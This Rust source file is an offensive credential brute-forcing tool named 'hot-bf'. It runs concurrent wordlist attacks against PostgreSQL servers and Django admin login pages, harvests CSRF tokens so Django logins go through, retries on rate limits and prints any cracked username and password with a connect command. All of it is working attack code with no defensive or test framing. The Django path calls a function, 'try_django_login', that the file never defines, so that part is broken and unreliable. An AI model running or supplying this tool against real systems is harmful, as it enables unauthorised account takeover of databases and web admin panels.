use clap::{Parser, Subcommand};
use colored::*;
use reqwest::header::{HeaderMap, HeaderValue, CONTENT_TYPE, COOKIE, REFERER};
use std::fs;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::sync::Semaphore;
use tokio_postgres::{Config, NoTls};

#[derive(Parser)]
#[command(name = "hot-bf", about = "Hot Omelet Brute Force Tool")]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Brute force PostgreSQL credentials
    Pgsql {
        /// Target host
        #[arg(short = 'H', long)]
        host: String,

        /// Target port
        #[arg(short, long, default_value = "5432")]
        port: u16,

        /// Username(s) to try (comma-separated)
        #[arg(short, long, default_value = "postgres,admin")]
        user: String,

        /// Password wordlist file
        #[arg(short, long)]
        wordlist: String,

        /// Number of concurrent threads
        #[arg(short, long, default_value = "20")]
        threads: usize,

        /// Connection timeout in seconds
        #[arg(long, default_value = "8")]
        timeout: u64,

        /// Database to connect to
        #[arg(short, long, default_value = "postgres")]
        database: String,

        /// Credentials file (user:pass per line)
        #[arg(short, long)]
        creds: Option<String>,
    },

    /// Brute force Django admin login
    Django {
        /// Target URL (e.g. http://target.com)
        #[arg(short = 'U', long)]
        url: String,

        /// Admin login path
        #[arg(long, default_value = "/admin/login/")]
        path: String,

        /// Username(s) to try (comma-separated)
        #[arg(short, long, default_value = "admin")]
        user: String,

        /// Password wordlist file
        #[arg(short, long)]
        wordlist: String,

        /// Number of concurrent threads
        #[arg(short, long, default_value = "10")]
        threads: usize,

        /// Request timeout in seconds
        #[arg(long, default_value = "10")]
        timeout: u64,

        /// Credentials file (user:pass per line)
        #[arg(short, long)]
        creds: Option<String>,
    },
}

struct BfStats {
    tried: AtomicU64,
    total: u64,
    found: AtomicBool,
    start: Instant,
}

impl BfStats {
    fn new(total: u64) -> Self {
        Self {
            tried: AtomicU64::new(0),
            total,
            found: AtomicBool::new(false),
            start: Instant::now(),
        }
    }

    fn inc(&self) -> u64 {
        self.tried.fetch_add(1, Ordering::Relaxed) + 1
    }

    fn rate(&self) -> f64 {
        let elapsed = self.start.elapsed().as_secs_f64();
        if elapsed > 0.0 {
            self.tried.load(Ordering::Relaxed) as f64 / elapsed
        } else {
            0.0
        }
    }
}

async fn try_pgsql(
    host: &str,
    port: u16,
    user: &str,
    password: &str,
    database: &str,
    timeout_secs: u64,
) -> Result<bool, String> {
    let mut config = Config::new();
    config
        .host(host)
        .port(port)
        .user(user)
        .password(password)
        .dbname(database)
        .connect_timeout(Duration::from_secs(timeout_secs));

    match tokio::time::timeout(
        Duration::from_secs(timeout_secs + 2),
        config.connect(NoTls),
    )
    .await
    {
        Ok(Ok((client, connection))) => {
            // Spawn connection handler
            tokio::spawn(async move {
                let _ = connection.await;
            });

            // Try a simple query to confirm
            match client.simple_query("SELECT version()").await {
                Ok(rows) => {
                    for row in &rows {
                        if let tokio_postgres::SimpleQueryMessage::Row(r) = row {
                            if let Some(version) = r.get(0) {
                                println!(
                                    "\n{}",
                                    format!(
                                        "  [DB VERSION] {}",
                                        version
                                    )
                                    .cyan()
                                );
                            }
                        }
                    }
                    Ok(true)
                }
                Ok(_) => Ok(true),
                Err(_) => Ok(true), // Auth succeeded even if query failed
            }
        }
        Ok(Err(e)) => {
            let err_str = e.to_string();
            if err_str.contains("authentication failed")
                || err_str.contains("28P01")
                || err_str.contains("password authentication failed")
            {
                Ok(false)
            } else if err_str.contains("too many connections")
                || err_str.contains("remaining connection slots")
            {
                Err("conn_limit".to_string())
            } else {
                Err(err_str)
            }
        }
        Err(_) => Err("timeout".to_string()),
    }
}

async fn run_pgsql_bf(
    host: String,
    port: u16,
    users: Vec<String>,
    passwords: Vec<String>,
    database: String,
    threads: usize,
    timeout: u64,
    creds: Option<Vec<(String, String)>>,
) {
    // Build credential pairs
    let mut pairs: Vec<(String, String)> = Vec::new();

    if let Some(cred_list) = creds {
        pairs.extend(cred_list);
    }

    for user in &users {
        for pass in &passwords {
            pairs.push((user.clone(), pass.clone()));
        }
    }

    // Deduplicate
    pairs.sort();
    pairs.dedup();

    let total = pairs.len() as u64;

    println!(
        "{}",
        format!(
            "\n  ╔══════════════════════════════════════════╗\n  ║   {} PostgreSQL Brute Force   ║\n  ╚══════════════════════════════════════════╝",
            "🔴 RED-BF"
        )
        .red()
        .bold()
    );

    println!(
        "  {} {}:{}",
        "Target:".bright_white().bold(),
        host.yellow(),
        port.to_string().yellow()
    );
    println!(
        "  {} {}",
        "Database:".bright_white().bold(),
        database.cyan()
    );
    println!(
        "  {} {}",
        "Users:".bright_white().bold(),
        users.join(", ").cyan()
    );
    println!(
        "  {} {}",
        "Passwords:".bright_white().bold(),
        total.to_string().cyan()
    );
    println!(
        "  {} {}",
        "Threads:".bright_white().bold(),
        threads.to_string().cyan()
    );
    println!("{}", "  ─────────────────────────────────────────".dimmed());

    let stats = Arc::new(BfStats::new(total));
    let semaphore = Arc::new(Semaphore::new(threads));
    let found = Arc::new(AtomicBool::new(false));

    let mut handles = Vec::new();

    for (user, pass) in pairs {
        if found.load(Ordering::Relaxed) {
            break;
        }

        let host = host.clone();
        let database = database.clone();
        let sem = semaphore.clone();
        let stats = stats.clone();
        let found = found.clone();

        let handle = tokio::spawn(async move {
            let _permit = sem.acquire().await.unwrap();

            if found.load(Ordering::Relaxed) {
                return;
            }

            let current = stats.inc();
            let rate = stats.rate();

            // Progress line
            eprint!(
                "\r  {} [{}/{}] {:.0}/s  {}:{}        ",
                "TRYING".dimmed(),
                current,
                stats.total,
                rate,
                user.dimmed(),
                if pass.len() > 20 {
                    format!("{}...", &pass[..17])
                } else {
                    pass.clone()
                }
                .dimmed()
            );

            let mut retries = 0;
            loop {
                match try_pgsql(&host, port, &user, &pass, &database, timeout).await {
                    Ok(true) => {
                        found.store(true, Ordering::Relaxed);
                        let elapsed = stats.start.elapsed();
                        eprintln!();
                        println!(
                            "\n  {} {} {}:{}",
                            "★".bright_yellow(),
                            "FOUND!".green().bold(),
                            user.green().bold(),
                            pass.green().bold()
                        );
                        println!(
                            "  {} {:.1}s ({} attempts, {:.0}/s)",
                            "Time:".bright_white().bold(),
                            elapsed.as_secs_f64(),
                            current,
                            rate
                        );
                        println!(
                            "\n  {} psql -h {} -p {} -U {} -d {}",
                            "Connect:".bright_white().bold(),
                            host,
                            port,
                            user,
                            database
                        );
                        return;
                    }
                    Ok(false) => break,
                    Err(e) if e == "conn_limit" => {
                        retries += 1;
                        if retries > 3 {
                            break;
                        }
                        tokio::time::sleep(Duration::from_millis(500 * retries)).await;
                    }
                    Err(e) if e == "timeout" => {
                        retries += 1;
                        if retries > 2 {
                            break;
                        }
                        tokio::time::sleep(Duration::from_millis(300)).await;
                    }
                    Err(_) => break,
                }
            }
        });

        handles.push(handle);
    }

    for h in handles {
        let _ = h.await;
    }

    if !found.load(Ordering::Relaxed) {
        let elapsed = stats.start.elapsed();
        eprintln!();
        println!(
            "\n  {} No valid credentials found",
            "✗".red().bold()
        );
        println!(
            "  {} {:.1}s ({} attempts, {:.0}/s)",
            "Time:".bright_white().bold(),
            elapsed.as_secs_f64(),
            stats.tried.load(Ordering::Relaxed),
            stats.rate()
        );
    }

    println!("{}", "\n  ─────────────────────────────────────────".dimmed());
}

async fn get_csrf_token(
    client: &reqwest::Client,
    login_url: &str,
) -> Result<String, String> {
    let resp = client
        .get(login_url)
        .send()
        .await
        .map_err(|e| format!("GET failed: {}", e))?;

    // Extract csrftoken from Set-Cookie header
    for cookie in resp.cookies() {
        if cookie.name() == "csrftoken" {
            return Ok(cookie.value().to_string());
        }
    }

    // Fallback: parse from response body (hidden input field)
    let body = resp.text().await.map_err(|e| format!("body read: {}", e))?;
    if let Some(pos) = body.find("name=\"csrfmiddlewaretoken\" value=\"") {
        let start = pos + "name=\"csrfmiddlewaretoken\" value=\"".len();
        if let Some(end) = body[start..].find('"') {
            return Ok(body[start..start + end].to_string());
        }
    }

    Err("no CSRF token found".to_string())
}

async fn try_django_login_fast(
    client: &reqwest::Client,
    login_url: &str,
    csrf_token: &str,
    user: &str,
    password: &str,
) -> Result<bool, String> {
    let form_body = format!(
        "csrfmiddlewaretoken={}&username={}&password={}&next=/admin/",
        urlencod(csrf_token),
        urlencod(user),
        urlencod(password)
    );

    let cookie_val = format!("csrftoken={}", csrf_token);
    let mut headers = HeaderMap::new();
    headers.insert(
        CONTENT_TYPE,
        HeaderValue::from_static("application/x-www-form-urlencoded"),
    );
    headers.insert(
        REFERER,
        HeaderValue::from_str(login_url).unwrap_or(HeaderValue::from_static("")),
    );
    headers.insert(
        COOKIE,
        HeaderValue::from_str(&cookie_val).unwrap_or(HeaderValue::from_static("")),
    );

    let resp = client
        .post(login_url)
        .headers(headers)
        .body(form_body)
        .send()
        .await
        .map_err(|e| e.to_string())?;

    let status = resp.status().as_u16();

    if status == 302 {
        if let Some(loc) = resp.headers().get("location") {
            let loc_str = loc.to_str().unwrap_or("");
            if loc_str.contains("/admin") && !loc_str.contains("login") {
                return Ok(true);
            }
        }
    }

    // 403 = CSRF token expired, need refresh
    if status == 403 {
        return Err("csrf_expired".to_string());
    }

    Ok(false)
}

fn urlencod(s: &str) -> String {
    let mut result = String::new();
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                result.push(b as char);
            }
            _ => {
                result.push_str(&format!("%{:02X}", b));
            }
        }
    }
    result
}

async fn run_django_bf(
    url: String,
    path: String,
    users: Vec<String>,
    passwords: Vec<String>,
    threads: usize,
    timeout: u64,
    creds: Option<Vec<(String, String)>>,
) {
    let mut pairs: Vec<(String, String)> = Vec::new();

    if let Some(cred_list) = creds {
        pairs.extend(cred_list);
    }

    for user in &users {
        for pass in &passwords {
            pairs.push((user.clone(), pass.clone()));
        }
    }

    pairs.sort();
    pairs.dedup();

    let total = pairs.len() as u64;
    let login_url = format!(
        "{}/{}",
        url.trim_end_matches('/'),
        path.trim_start_matches('/')
    );

    println!(
        "{}",
        format!(
            "\n  ╔══════════════════════════════════════════╗\n  ║   {} Django Admin Brute Force  ║\n  ╚══════════════════════════════════════════╝",
            "🔴 RED-BF"
        )
        .red()
        .bold()
    );

    println!(
        "  {} {}",
        "Target:".bright_white().bold(),
        login_url.yellow()
    );
    println!(
        "  {} {}",
        "Users:".bright_white().bold(),
        users.join(", ").cyan()
    );
    println!(
        "  {} {}",
        "Passwords:".bright_white().bold(),
        total.to_string().cyan()
    );
    println!(
        "  {} {}",
        "Threads:".bright_white().bold(),
        threads.to_string().cyan()
    );
    println!("{}", "  ─────────────────────────────────────────".dimmed());

    // Pre-flight: verify login page is reachable and get a CSRF token
    let preflight_client = reqwest::Client::builder()
        .cookie_store(true)
        .timeout(Duration::from_secs(timeout))
        .build()
        .unwrap();

    match get_csrf_token(&preflight_client, &login_url).await {
        Ok(token) => {
            println!(
                "  {} CSRF token obtained ({}...)",
                "✓".green(),
                &token[..token.len().min(12)]
            );
        }
        Err(e) => {
            println!(
                "\n  {} Cannot reach login page: {}",
                "✗".red().bold(),
                e
            );
            return;
        }
    }

    let stats = Arc::new(BfStats::new(total));
    let semaphore = Arc::new(Semaphore::new(threads));
    let found = Arc::new(AtomicBool::new(false));

    let mut handles = Vec::new();

    for (user, pass) in pairs {
        if found.load(Ordering::Relaxed) {
            break;
        }

        let login_url = login_url.clone();
        let sem = semaphore.clone();
        let stats = stats.clone();
        let found = found.clone();

        let handle = tokio::spawn(async move {
            let _permit = sem.acquire().await.unwrap();

            if found.load(Ordering::Relaxed) {
                return;
            }

            let current = stats.inc();
            let rate = stats.rate();

            eprint!(
                "\r  {} [{}/{}] {:.0}/s  {}:{}        ",
                "TRYING".dimmed(),
                current,
                stats.total,
                rate,
                user.dimmed(),
                if pass.len() > 20 {
                    format!("{}...", &pass[..17])
                } else {
                    pass.clone()
                }
                .dimmed()
            );

            let mut retries = 0;
            loop {
                match try_django_login(&login_url, &user, &pass, 10).await {
                    Ok(true) => {
                        found.store(true, Ordering::Relaxed);
                        let elapsed = stats.start.elapsed();
                        eprintln!();
                        println!(
                            "\n  {} {} {}:{}",
                            "★".bright_yellow(),
                            "FOUND!".green().bold(),
                            user.green().bold(),
                            pass.green().bold()
                        );
                        println!(
                            "  {} {:.1}s ({} attempts, {:.0}/s)",
                            "Time:".bright_white().bold(),
                            elapsed.as_secs_f64(),
                            current,
                            rate
                        );
                        println!(
                            "\n  {} {}  (user: {} / pass: {})",
                            "Login:".bright_white().bold(),
                            login_url,
                            user,
                            pass
                        );
                        return;
                    }
                    Ok(false) => break,
                    Err(e) => {
                        retries += 1;
                        if retries > 2 {
                            break;
                        }
                        if e.contains("timeout") || e.contains("connect") {
                            tokio::time::sleep(Duration::from_millis(500 * retries)).await;
                        } else {
                            break;
                        }
                    }
                }
            }
        });

        handles.push(handle);
    }

    for h in handles {
        let _ = h.await;
    }

    if !found.load(Ordering::Relaxed) {
        let elapsed = stats.start.elapsed();
        eprintln!();
        println!(
            "\n  {} No valid credentials found",
            "✗".red().bold()
        );
        println!(
            "  {} {:.1}s ({} attempts, {:.0}/s)",
            "Time:".bright_white().bold(),
            elapsed.as_secs_f64(),
            stats.tried.load(Ordering::Relaxed),
            stats.rate()
        );
    }

    println!("{}", "\n  ─────────────────────────────────────────".dimmed());
}

fn load_wordlist(path: &str) -> Vec<String> {
    match fs::read_to_string(path) {
        Ok(content) => content
            .lines()
            .map(|l| l.trim().to_string())
            .filter(|l| !l.is_empty() && !l.starts_with('#'))
            .collect(),
        Err(e) => {
            eprintln!(
                "  {} Failed to read wordlist {}: {}",
                "✗".red().bold(),
                path,
                e
            );
            std::process::exit(1);
        }
    }
}

fn load_creds_file(path: &str) -> Vec<(String, String)> {
    match fs::read_to_string(path) {
        Ok(content) => content
            .lines()
            .filter_map(|l| {
                let l = l.trim();
                if l.is_empty() || l.starts_with('#') {
                    return None;
                }
                let parts: Vec<&str> = l.splitn(2, ':').collect();
                if parts.len() == 2 {
                    Some((parts[0].to_string(), parts[1].to_string()))
                } else {
                    None
                }
            })
            .collect(),
        Err(e) => {
            eprintln!(
                "  {} Failed to read creds file {}: {}",
                "✗".red().bold(),
                path,
                e
            );
            std::process::exit(1);
        }
    }
}

#[tokio::main]
async fn main() {
    let cli = Cli::parse();

    match cli.command {
        Commands::Pgsql {
            host,
            port,
            user,
            wordlist,
            threads,
            timeout,
            database,
            creds,
        } => {
            let users: Vec<String> = user.split(',').map(|s| s.trim().to_string()).collect();
            let passwords = load_wordlist(&wordlist);
            let cred_pairs = creds.map(|c| load_creds_file(&c));

            run_pgsql_bf(host, port, users, passwords, database, threads, timeout, cred_pairs)
                .await;
        }
        Commands::Django {
            url,
            path,
            user,
            wordlist,
            threads,
            timeout,
            creds,
        } => {
            let users: Vec<String> = user.split(',').map(|s| s.trim().to_string()).collect();
            let passwords = load_wordlist(&wordlist);
            let cred_pairs = creds.map(|c| load_creds_file(&c));

            run_django_bf(url, path, users, passwords, threads, timeout, cred_pairs).await;
        }
    }
}
